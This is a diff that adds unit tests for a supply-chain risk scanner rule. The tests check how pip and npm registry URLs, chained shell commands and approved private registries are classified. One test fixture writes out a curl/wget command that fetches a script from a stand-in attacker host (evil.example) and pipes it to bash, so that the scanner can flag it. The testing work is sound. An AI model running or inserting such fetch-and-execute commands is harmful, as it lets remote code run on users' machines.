@@ -1,10 +1,20 @@
 """SR-008: Supply chain risk rule unit tests."""
 
 import json
+from datetime import date
 
 import pytest
 
+from scanners.risk_scanner.analyzers.url_context import (
+    URL_USAGE_UNKNOWN,
+    classify_url_usage,
+)
 from scanners.risk_scanner.rules import supply_chain
+from scanners.risk_scanner.registry_policy import (
+    RegistryClassification,
+    RegistryEntry,
+    RegistryPolicy,
+)
 from tests.scanner_mock import MockScanner
 
 
@@ -12,6 +22,19 @@ from tests.scanner_mock import MockScanner
 def _no_osv_network(monkeypatch):
     """SR-008 must never hit the real OSV.dev API in tests."""
     monkeypatch.setattr(supply_chain, "_query_osv", lambda *args, **kwargs: [])
+
+
+@pytest.fixture
+def source_observations(monkeypatch):
+    observations = []
+    check_sources = supply_chain._check_dependency_sources
+
+    def capture_sources(scanner, sources):
+        observations.extend(sources)
+        check_sources(scanner, sources)
+
+    monkeypatch.setattr(supply_chain, "_check_dependency_sources", capture_sources)
+    return observations
 
 
 class TestSR008SupplyChain:
@@ -197,6 +220,594 @@ class TestSR008SupplyChain:
             "非官方依赖源" in finding["title"] for finding in s.findings
         )
 
+    def test_short_find_links_and_bare_url_are_one_policy_advisory(self):
+        s = MockScanner(files={})
+        s._file_contents = {
+            "requirements.txt": (
+                "-f https://evil.example/wheels\n"
+                "https://evil.example/demo-1.0-py3-none-any.whl\n"
+            )
+        }
+
+        supply_chain.run(s)
+
+        advisories = [
+            item for item in s.review_advisories
+            if item["code"] == "dependency_registry_policy"
+        ]
+        assert len(advisories) == 1
+        assert "2 条" in advisories[0]["description"]
+        assert "evil.example (2)" in advisories[0]["evidence"]
+        assert "unknown_host (2)" in advisories[0]["evidence"]
+        assert s.findings == []
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "npm install -f --registry https://mirror.internal/ demo\n",
+            "npm install -f \\\n  --registry https://mirror.internal/ demo\n",
+        ],
+    )
+    def test_npm_force_keeps_registry_api_approval(self, command):
+        s = MockScanner(files={"setup.sh": command})
+        s.registry_policy = RegistryPolicy([
+            RegistryEntry(
+                ecosystem="npm",
+                exact_host="mirror.internal",
+                classification=RegistryClassification.APPROVED_PRIVATE,
+                evidence_url="https://security.internal/npm",
+                allow_as_resolved_download=False,
+                note="Approved for npm registry API use only.",
+                reviewed_at=date(2026, 9, 23),
+            )
+        ])
+
+        supply_chain.run(s)
+
+        assert s.review_advisories == []
+
+    @pytest.mark.parametrize(
+        ("separator", "pip_first"),
+        [("&&", False), ("||", True), (";", False), ("|", True)],
+    )
+    @pytest.mark.parametrize("approved_ecosystem", ["npm", "pypi"])
+    def test_chained_pip_registry_uses_its_own_ecosystem(
+        self, separator, pip_first, approved_ecosystem, source_observations
+    ):
+        url = "https://registry.corp.example/simple"
+        commands = ["npm install demo", f"pip install --index-url {url} demo"]
+        if pip_first:
+            commands.reverse()
+        s = MockScanner(files={
+            "setup.sh": f"{commands[0]} \\\n  {separator} {commands[1]}\n"
+        })
+        s.registry_policy = RegistryPolicy([
+            RegistryEntry(
+                ecosystem=approved_ecosystem,
+                exact_host="registry.corp.example",
+                classification=RegistryClassification.APPROVED_PRIVATE,
+                evidence_url="https://security.example/registries",
+                allow_as_resolved_download=False,
+                note="Approved for registry API use in one ecosystem only.",
+                reviewed_at=date(2026, 9, 24),
+            )
+        ])
+
+        supply_chain.run(s)
+
+        assert [
+            (source.url, source.ecosystem, source.usage)
+            for source in source_observations
+        ] == [(url, "pypi", "registry_api")]
+        if approved_ecosystem == "npm":
+            assert len(s.review_advisories) == 1
+            assert "wrong_ecosystem (1)" in s.review_advisories[0]["evidence"]
+        else:
+            assert s.review_advisories == []
+
+    @pytest.mark.parametrize("subshell_start", ["(pip", "( pip"])
+    def test_pip_registry_in_subshell_does_not_use_npm_approval(
+        self, subshell_start, source_observations
+    ):
+        url = "https://registry.corp.example/simple"
+        s = MockScanner(files={
+            "setup.sh": (
+                "npm install demo \\\n"
+                f"  && {subshell_start} install -i {url} demo)\n"
+            )
+        })
+        s.registry_policy = RegistryPolicy([
+            RegistryEntry(
+                ecosystem="npm",
+                exact_host="registry.corp.example",
+                classification=RegistryClassification.APPROVED_PRIVATE,
+                evidence_url="https://security.example/npm",
+                allow_as_resolved_download=False,
+                note="Approved for npm registry API use only.",
+                reviewed_at=date(2026, 9, 24),
+            )
+        ])
+
+        supply_chain.run(s)
+
+        assert [
+            (source.url, source.ecosystem, source.usage)
+            for source in source_observations
+        ] == [(url, "pypi", "registry_api")]
+        assert len(s.review_advisories) == 1
+        assert "wrong_ecosystem (1)" in s.review_advisories[0]["evidence"]
+
+    def test_chained_registry_urls_keep_separate_ecosystems(
+        self, source_observations
+    ):
+        npm_url = "https://registry.corp.example/npm"
+        pip_url = "https://registry.corp.example/simple"
+        s = MockScanner(files={
+            "setup.sh": (
+                f"npm install --registry {npm_url} demo \\\n"
+                f"  && pip install --index-url {pip_url} demo\n"
+            )
+        })
+        s.registry_policy = RegistryPolicy([
+            RegistryEntry(
+                ecosystem="npm",
+                exact_host="registry.corp.example",
+                classification=RegistryClassification.APPROVED_PRIVATE,
+                evidence_url="https://security.example/npm",
+                allow_as_resolved_download=False,
+                note="Approved for npm registry API use only.",
+                reviewed_at=date(2026, 9, 24),
+            )
+        ])
+
+        supply_chain.run(s)
+
+        assert [
+            (source.url, source.ecosystem, source.usage)
+            for source in source_observations
+        ] == [
+            (npm_url, "npm", "registry_api"),
+            (pip_url, "pypi", "registry_api"),
+        ]
+        assert len(s.review_advisories) == 1
+        assert "wrong_ecosystem (1)" in s.review_advisories[0]["evidence"]
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            'pip install --log "npm && yarn || node; cargo | nuget.log" \\\n'
+            "  --index-url https://registry.corp.example/simple demo\n",
+            "pip install --index-url \\\n"
+            "  https://registry.corp.example/npm/simple demo\n",
+            "npm install demo\n"
+            "pip install --index-url https://registry.corp.example/simple demo\n",
+        ],
+        ids=["quoted-separators", "url-keyword", "adjacent-command"],
+    )
+    def test_pip_registry_ecosystem_ignores_unrelated_context(
+        self, command, source_observations
+    ):
+        s = MockScanner(files={"setup.sh": command})
+        s.registry_policy = RegistryPolicy([
+            RegistryEntry(
+                ecosystem="pypi",
+                exact_host="registry.corp.example",
+                classification=RegistryClassification.APPROVED_PRIVATE,
+                evidence_url="https://security.example/pypi",
+                allow_as_resolved_download=False,
+                note="Approved for PyPI registry API use only.",
+                reviewed_at=date(2026, 9, 24),
+            )
+        ])
+
+        supply_chain.run(s)
+
+        assert len(source_observations) == 1
+        assert source_observations[0].ecosystem == "pypi"
+        assert source_observations[0].usage == "registry_api"
+        assert s.review_advisories == []
+
+    @pytest.mark.parametrize(
+        "installer",
+        [
+            "pip install npm",
+            "sudo -H python3 -I -m pip install",
+            "env PACKAGE_NAME=npm pip install",
+            "command pip install",
+        ],
+    )
+    def test_installer_position_controls_ecosystem(self, installer, source_observations):
+        s = MockScanner(files={
+            "setup.sh": f"{installer} --index-url https://pypi.org/simple demo\n"
+        })
+
+        supply_chain.run(s)
+
+        assert len(source_observations) == 1
+        assert source_observations[0].ecosystem == "pypi"
+        assert source_observations[0].ecosystem_ambiguous is False
+        assert s.review_advisories == []
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "npm install --index-url https://registry.corp.example/simple demo\n",
+            'sh -c "npm --version; pip install --index-url '
+            'https://registry.corp.example/simple demo"\n',
+        ],
+    )
+    def test_ambiguous_installer_cannot_use_unknown_registry_fallback(
+        self, command, source_observations
+    ):
+        s = MockScanner(files={"setup.sh": command})
+        s.registry_policy = RegistryPolicy([
+            RegistryEntry(
+                ecosystem="npm",
+                exact_host="registry.corp.example",
+                classification=RegistryClassification.APPROVED_PRIVATE,
+                evidence_url="https://security.example/npm",
+                allow_as_resolved_download=True,
+                note="Approved only for npm.",
+                reviewed_at=date(2026, 9, 24),
+            )
+        ])
+
+        supply_chain.run(s)
+
+        assert len(source_observations) == 1
+        assert source_observations[0].ecosystem == "unknown"
+        assert source_observations[0].ecosystem_ambiguous is True
+        assert len(s.review_advisories) == 1
+        assert "ambiguous_ecosystem (1)" in s.review_advisories[0]["evidence"]
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            'DOWNLOAD_URL = "https://registry.npmjs.org/npm/-/npm-11.0.0.tgz"\n',
+            "curl --output npm.tgz https://registry.npmjs.org/npm/-/npm-11.0.0.tgz\n",
+            'curl -H "X-Npm-Session: abc" '
+            "https://registry.npmjs.org/npm/-/npm-11.0.0.tgz\n",
+        ],
+    )
+    def test_download_without_installer_context_keeps_unknown_fallback(
+        self, command, source_observations
+    ):
+        s = MockScanner(files={"setup.sh": command})
+
+        supply_chain.run(s)
+
+        assert len(source_observations) == 1
+        assert source_observations[0].ecosystem == "unknown"
+        assert source_observations[0].ecosystem_ambiguous is False
+        assert s.review_advisories == []
+
+    @pytest.mark.parametrize("ambiguous_first", [False, True])
+    def test_ambiguous_source_survives_deduplication_with_absent_context(
+        self, ambiguous_first
+    ):
+        url = "https://registry.npmjs.org/npm/-/npm-11.0.0.tgz"
+        files = [
+            ("download.py", f'DOWNLOAD_URL = "{url}"\n'),
+            ("setup.sh", f'sh -c "npm --version; pip install {url}"\n'),
+        ]
+        if ambiguous_first:
+            files.reverse()
+        s = MockScanner(files=dict(files))
+
+        supply_chain.run(s)
+
+        assert len(s.review_advisories) == 1
+        assert "ambiguous_ecosystem (1)" in s.review_advisories[0]["evidence"]
+
+    @pytest.mark.parametrize(
+        ("installer", "option", "ecosystem"),
+        [
+            ("pip install", "--index-url", "pypi"),
+            ("pip install", "-i", "pypi"),
+            ("npm install", "--registry", "npm"),
+        ],
+    )
+    @pytest.mark.parametrize("empty_value", [False, True])
+    def test_indented_registry_value_only_binds_to_option_without_equals(
+        self, installer, option, ecosystem, empty_value
+    ):
+        separator = "=\\\n    " if empty_value else " \\\n    "
+        s = MockScanner(files={
+            "setup.sh": (
+                f"{installer} {option}{separator}https://corp.example/simple demo\n"
+            )
+        })
+        s.registry_policy = RegistryPolicy([
+            RegistryEntry(
+                ecosystem=ecosystem,
+                exact_host="corp.example",
+                classification=RegistryClassification.APPROVED_PRIVATE,
+                evidence_url="https://security.example/registries",
+                allow_as_resolved_download=False,
+                note="Approved for registry API use only.",
+                reviewed_at=date(2026, 9, 24),
+            )
+        ])
+
+        supply_chain.run(s)
+
+        if empty_value:
+            # Shell continuation preserves indentation, so the URL is a new
+            # positional argument after --option= (or the short -i= value).
+            assert len(s.review_advisories) == 1
+            assert "usage_not_allowed (1)" in s.review_advisories[0]["evidence"]
+        else:
+            assert s.review_advisories == []
+
+    @pytest.mark.parametrize(
+        ("installer", "url", "reason"),
+        [
+            ("npm install", "https://corp.example/demo.tgz", "unknown_host"),
+            ("pip install", "https://corp.example/demo.whl", "unknown_host"),
+            ("pip install", "https://pypi.org/simple/demo/", "usage_not_allowed"),
+        ],
+    )
+    def test_fourth_line_url_uses_installer_outside_physical_window(
+        self, installer, url, reason
+    ):
+        command = (
+            f"{installer} \\\n"
+            "  --quiet \\\n"
+            "  -- \\\n"
+            f"  {url}\n"
+        )
+        assert classify_url_usage(command, 4, url) == URL_USAGE_UNKNOWN
+        s = MockScanner(files={"setup.sh": command})
+
+        supply_chain.run(s)
+
+        assert len(s.review_advisories) == 1
+        advisory = s.review_advisories[0]
+        assert advisory["code"] == "dependency_registry_policy"
+        assert advisory["requires_manual_review"] is True
+        assert f"{reason} (1)" in advisory["evidence"]
+
+    @pytest.mark.parametrize(
+        "config_command",
+        [
+            "npm config set @scope:registry",
+            "npm config set //corp.example:registry",
+            "npm set registry",
+        ],
+    )
+    @pytest.mark.parametrize("separator", [" ", " \\\n  ", "=", "=\\\n"])
+    def test_npm_registry_config_forms_keep_api_approval(
+        self, config_command, separator
+    ):
+        s = MockScanner(files={
+            "setup.sh": f"{config_command}{separator}https://corp.example/\n"
+        })
+        s.registry_policy = RegistryPolicy([
+            RegistryEntry(
+                ecosystem="npm",
+                exact_host="corp.example",
+                classification=RegistryClassification.APPROVED_PRIVATE,
+                evidence_url="https://security.example/npm",
+                allow_as_resolved_download=False,
+                note="Approved for registry API use only.",
+                reviewed_at=date(2026, 9, 24),
+            )
+        ])
+
+        supply_chain.run(s)
+
+        assert s.review_advisories == []
+
+    def test_npm_registry_config_does_not_approve_following_download(self):
+        s = MockScanner(files={
+            "setup.sh": (
+                "npm config set @scope:registry https://registry.corp.example/ \\\n"
+                "  && npm install https://registry.corp.example/demo.tgz\n"
+            )
+        })
+        s.registry_policy = RegistryPolicy([
+            RegistryEntry(
+                ecosystem="npm",
+                exact_host="registry.corp.example",
+                classification=RegistryClassification.APPROVED_PRIVATE,
+                evidence_url="https://security.example/npm",
+                allow_as_resolved_download=False,
+                note="Approved for registry API use only.",
+                reviewed_at=date(2026, 9, 24),
+            )
+        ])
+
+        supply_chain.run(s)
+
+        assert len(s.review_advisories) == 1
+        assert "usage_not_allowed (1)" in s.review_advisories[0]["evidence"]
+
+    def test_registry_suffix_in_positional_url_does_not_approve_next_url(self):
+        s = MockScanner(files={
+            "setup.sh": (
+                "pip install https://pypi.org/simple/demo:registry \\\n"
+                "  https://pypi.org/simple/demo.whl\n"
+            )
+        })
+
+        supply_chain.run(s)
+
+        assert len(s.review_advisories) == 1
+        assert "usage_not_allowed (2)" in s.review_advisories[0]["evidence"]
+
+    @pytest.mark.parametrize(
+        ("installer", "option", "approved"),
+        [
+            ("npm install", "--registry", False),
+            ("pip install", "--registry", False),
+            ("pip install", "--index-url", False),
+            ("pip install", "--find-links", False),
+            ("pip install", "--find-links", True),
+        ],
+    )
+    @pytest.mark.parametrize("downloader", ["curl", "wget -qO-"])
+    def test_later_shell_pipeline_keeps_earlier_source_observation(
+        self, installer, option, approved, downloader
+    ):
+        s = MockScanner(files={
+            "setup.sh": (
+                f"{installer} {option} https://corp.example/simple demo \\\n"
+                "  && apt-get update \\\n"
+                "  && apt-get install -y ca-certificates curl \\\n"
+                f"  && {downloader} https://evil.example/x.sh | bash\n"
+            )
+        })
+        if approved:
+            s.registry_policy = RegistryPolicy([
+                RegistryEntry(
+                    ecosystem="pypi",
+                    exact_host="corp.example",
+                    classification=RegistryClassification.APPROVED_PRIVATE,
+                    evidence_url="https://security.example/pypi",
+                    allow_as_resolved_download=False,
+                    note="Approved for registry API use only.",
+                    reviewed_at=date(2026, 9, 24),
+                )
+            ])
+
+        supply_chain.run(s)
+
+        assert len(s.review_advisories) == 1
+        evidence = s.review_advisories[0]["evidence"]
+        assert "corp.example (1)" in evidence
+        reason = "usage_not_allowed" if approved else "unknown_host"
+        assert f"{reason} (1)" in evidence
+        assert any("pipe shell" in finding["title"] for finding in s.findings)
+
+    @pytest.mark.parametrize("separator", ["\f", "\v", "\x1c"])
+    def test_non_newline_whitespace_preserves_url_option_offset(self, separator):
+        s = MockScanner(files={
+            "setup.sh": (
+                f"pip install --index-url {separator}"
+                "    https://pypi.org/simple demo\n"
+            )
+        })
+
+        supply_chain.run(s)
+
+        assert s.review_advisories == []
+
+    @pytest.mark.parametrize("option", ["-f", "--find-links"])
+    def test_pip_find_links_continuation_requires_download_approval(
+        self, option
+    ):
+        s = MockScanner(files={
+            "setup.sh": (
+                f"pip install {option} \\\n"
+                "  https://registry.example/wheels demo\n"
+            )
+        })
+        s.registry_policy = RegistryPolicy([
+            RegistryEntry(
+                ecosystem="pypi",
+                exact_host="registry.example",
+                classification=RegistryClassification.APPROVED_PRIVATE,
+                evidence_url="https://security.example/pypi",
+                allow_as_resolved_download=False,
+                note="Approved for registry API use only.",
+                reviewed_at=date(2026, 9, 23),
+            )
+        ])
+
+        supply_chain.run(s)
+
+        advisories = [
+            item for item in s.review_advisories
+            if item["code"] == "dependency_registry_policy"
+        ]
+        assert len(advisories) == 1
+        assert "usage_not_allowed (1)" in advisories[0]["evidence"]
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "pip install --index-url https://pypi.org/simple \\\n"
+            "  https://pypi.org/simple/demo/\n",
+            "pip install --index-url \\\n"
+            "  https://pypi.org/simple https://pypi.org/simple/demo/\n",
+            "pip install \\\n  --disable-pip-version-check \\\n"
+            "  --no-cache-dir \\\n  --index-url \\\n"
+            "  https://pypi.org/simple https://pypi.org/simple/demo/\n",
+            'pip install -i="https://pypi.org/simple" \\\n'
+            '  "https://pypi.org/simple/demo/"\n',
+            "pip install --index-url https://pypi.org/simple \\\n"
+            "  https://pypi.org/simple\n",
+            "pip install https://pypi.org/simple \\\n"
+            "  --index-url https://pypi.org/simple\n",
+            "pip install registry \\\n  https://pypi.org/simple/demo/\n",
+            "pip install -- \\\n  --index-url https://pypi.org/simple/demo/\n",
+        ],
+    )
+    def test_continued_index_option_does_not_approve_positional_url(self, command):
+        s = MockScanner(files={"setup.sh": command})
+
+        supply_chain.run(s)
+
+        assert len(s.review_advisories) == 1
+        advisory = s.review_advisories[0]
+        assert advisory["requires_manual_review"] is True
+        assert "usage_not_allowed (1)" in advisory["evidence"]
+        assert "pypi.org (1)" in advisory["evidence"]
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "pip install --find-links https://files.pythonhosted.org/wheels/ \\\n"
+            "  --index-url https://pypi.org/simple demo\n",
+            "pip install --index-url https://pypi.org/simple \\\n"
+            "  --find-links https://files.pythonhosted.org/wheels/ demo\n",
+            "pip install \\\n  --disable-pip-version-check \\\n"
+            "  --no-cache-dir \\\n  -f \\\n"
+            "  https://files.pythonhosted.org/wheels/ -i https://pypi.org/simple demo\n",
+            'pip install -f="https://files.pythonhosted.org/wheels/" \\\n'
+            '  -i="https://pypi.org/simple" demo\n',
+        ],
+    )
+    def test_continued_mixed_source_options_keep_separate_usage(self, command):
+        s = MockScanner(files={"setup.sh": command})
+
+        supply_chain.run(s)
+
+        assert s.review_advisories == []
+
+    def test_requirements_continued_official_index_has_no_policy_advisory(self):
+        s = MockScanner(files={})
+        s._file_contents = {
+            "requirements.txt": "--index-url \\\n  https://pypi.org/simple\n"
+        }
+
+        supply_chain.run(s)
+
+        assert s.review_advisories == []
+
+    @pytest.mark.parametrize(
+        ("url", "reason"),
+        [
+            ("https://pypi.org/simple/demo/", "usage_not_allowed"),
+            ("https://packages.example/demo.whl", "unknown_host"),
+        ],
+    )
+    def test_requirements_incomplete_index_option_requires_source_review(
+        self, url, reason
+    ):
+        s = MockScanner(files={})
+        s._file_contents = {
+            "requirements.txt": f"--index-url=\\\n    {url}\n"
+        }
+
+        supply_chain.run(s)
+
+        assert len(s.review_advisories) == 1
+        advisory = s.review_advisories[0]
+        assert advisory["code"] == "dependency_registry_policy"
+        assert advisory["requires_manual_review"] is True
+        assert f"{reason} (1)" in advisory["evidence"]
+
     def test_registry_advisory_lists_only_five_hosts_plus_count(self):
         packages = {
             f"node_modules/dependency-{index}": {
@@ -340,8 +951,8 @@ class TestSR008SupplyChain:
     def test_official_short_form_registry_commands_have_no_advisory(
         self, command
     ):
-        assert supply_chain._dependency_usage_near_line(
-            command.split("\n"), 1
+        assert supply_chain._dependency_usage_for_url(
+            command, command.index("https://")
         ) == "registry_api"
         s = MockScanner(files={"setup.sh": command})
 
